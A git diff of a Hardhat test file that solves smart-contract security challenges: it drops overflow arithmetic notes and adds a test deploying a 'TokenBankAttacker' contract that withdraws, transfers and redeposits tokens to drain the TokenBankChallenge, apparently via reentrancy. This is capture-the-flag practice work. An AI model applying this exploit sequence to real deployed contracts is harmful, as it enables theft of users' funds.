@@ -195,15 +195,8 @@ describe("Tests", function () {
   });
 
   describe("TokenWhale", () => {
-    it.only("Tricks the contract to underflow", async () => {
+    it("Tricks the contract to underflow", async () => {
       const [mainAcc, altAcc] = await ethers.getSigners();
-      /**
-       * (2^256 - 1) / 10^18 + 1
-       * =
-       * result = 115792089237316195423570985008687907853269984665640564039458
-       *
-       * uint256(result) * 10^18 = 415992086870360064
-       */
 
       const TW = await ethers.getContractFactory("TokenWhaleChallenge");
 
@@ -221,18 +214,6 @@ describe("Tests", function () {
 
   describe("TokenBank", () => {
     it("Gets more tokens than it should", async () => {
-      /**
-       * (2^256 - 1) / 10^18 + 1
-       * =
-       * result = 115792089237316195423570985008687907853269984665640564039458
-       *
-       * uint256(result) * 10^18 = 415992086870360064
-       */
-      const maxIntAnd1 = BigNumber.from(
-        "115792089237316195423570985008687907853269984665640564039458"
-      );
-
-      const overflowed = BigNumber.from("415992086870360064");
       const TS = await ethers.getContractFactory("TokenSaleChallenge");
 
       const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
@@ -242,6 +223,49 @@ describe("Tests", function () {
       await ts.sell(1);
 
       expect(await ts.isComplete()).to.equal(true);
+    });
+  });
+
+  describe("TokenBankChallenge", () => {
+    it.only("Solves the challenge", async () => {
+      const [_owner, attacker] = await ethers.getSigners();
+      const challengeFactory = await ethers.getContractFactory(
+        "TokenBankChallenge"
+      );
+      const bankContract = await challengeFactory.deploy(
+        await attacker.getAddress()
+      );
+      await bankContract.deployed();
+
+      const tokenAddress = await bankContract.token();
+      const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
+      const tokenContract = tokenFactory.attach(tokenAddress);
+
+      const attackFactory = await ethers.getContractFactory(
+        "TokenBankAttacker"
+      );
+      const attackContract = await attackFactory.deploy(
+        bankContract.address,
+        tokenContract.address
+      );
+      await attackContract.deployed();
+
+      const tokens = BigNumber.from(10).pow(18).mul(500000);
+
+      // Withdraw tokens: Bank -> Attacker EOA
+      await bankContract.connect(attacker).withdraw(tokens);
+
+      // Transfer tokens: Attacker EOA -> Attacker Contract
+      await tokenContract
+        .connect(attacker)
+        ["transfer(address,uint256)"](attackContract.address, tokens);
+
+      // Deposit tokens: Attacker Contract -> Bank
+      await attackContract.connect(attacker).deposit();
+
+      await attackContract.connect(attacker).withdraw();
+
+      expect(await bankContract.isComplete()).to.be.true;
     });
   });
 });
